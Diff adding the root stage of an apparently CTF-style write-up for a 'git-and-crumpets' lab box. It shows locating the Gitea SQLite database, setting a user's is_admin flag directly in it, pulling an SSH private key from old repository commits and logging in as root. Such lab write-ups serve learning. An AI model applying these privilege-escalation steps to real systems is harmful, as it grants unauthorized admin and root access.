@@ -85,10 +85,81 @@ Its abse64 encoded, so decode it. If you forget ...
 echo dGhte2ZYzZDZhYTE2fQ=|base64 -d 
 ```
 
+## Root
 
-
-
-
-```
+Let's now look around the system for any gitea related files (database, config etc)
 
 ```
+find / -type f 2>/dev/null | grep "gitea" | grep "db"
+```
+```
+/var/lib/gitea/data/gitea.db      << Looks like what we need!! 
+
+/var/lib/gitea/data/gitea-repositories/root/backup.git/objects/05/2db66e7afb93b756a8fd79b1d794299e40a684
+/var/lib/gitea/data/gitea-repositories/scones/cant-touch-this.git/objects/7a/8cad890480058860f42788db193afa38182cb6
+/var/lib/gitea/data/queues/push_update/000002.ldb
+/var/lib/gitea/data/queues/notification-service/000002.ldb
+/var/lib/gitea/data/queues/repo_stats_update/000002.ldb
+/var/lib/gitea/data/queues/pr_patch_checker/000002.ldb
+```
+Now change to the directory. Running ```file /var/lib/gitea/data/gitea.db```  
+Shows us this is a SQlite3 database. 
+
+![image](https://user-images.githubusercontent.com/5285547/124519198-82b14300-dde0-11eb-839b-2be44023705f.png)
+
+```
+sqlite3 gitea.db
+```
+
+- SQlite3 Basic Cheatsheet
+
+```
+sqlite> .database              #List database
+slqite> .tables                #List tables
+sqlite> .scheme user           #List schema of the table users
+sqlite> .mode column           #Set mode to column
+sqlite> .mode tab
+sqlite> .mode line             #Set mode to line   - my preffered here. 
+sqlite> .width 10 25 3 6 15    #Set width of column
+sqlite> .show                  #Show column settings
+```
+
+After listing the tables and seeing a user table, lets get the data to some passwords hopefully. 
+Trying the crack the passwords was taking a really long time, so I opted to edit the user we had access to. 
+Giving him admin access via the sqlite database. 
+
+```
+UPDATE user SET is_admin=1 WHERE id=3;
+```
+
+Going back to the application we now see a new repo. 
+
+![image](https://user-images.githubusercontent.com/5285547/124520096-47fcda00-dde3-11eb-95e8-07978deb579b.png)
+
+Looking at the brances, we can see a new file ```dotfiles```
+
+![image](https://user-images.githubusercontent.com/5285547/124520136-6fec3d80-dde3-11eb-9334-a483faa55567.png)
+
+With old commits, one in particular looks very interesting. 
+
+![image](https://user-images.githubusercontent.com/5285547/124520169-87c3c180-dde3-11eb-8c29-898af75e9768.png)
+
+An ssh key!!
+
+![image](https://user-images.githubusercontent.com/5285547/124520205-a1fd9f80-dde3-11eb-9870-887b41eec23e.png)
+
+Copying the contents to a new file and making it executable. Then using the "password" from the file name. 
+We can now access SSH and get the last flag. 
+
+```
+nano id_rsa   #copy contents in
+chmod 600 id_rsa
+ssh root@git-and-crumpets -i id_rsa
+```
+
+![image](https://user-images.githubusercontent.com/5285547/124520332-133d5280-dde4-11eb-9faa-8a83df540199.png)
+
+Now we got the last flag and owned the box! 
+
+
+
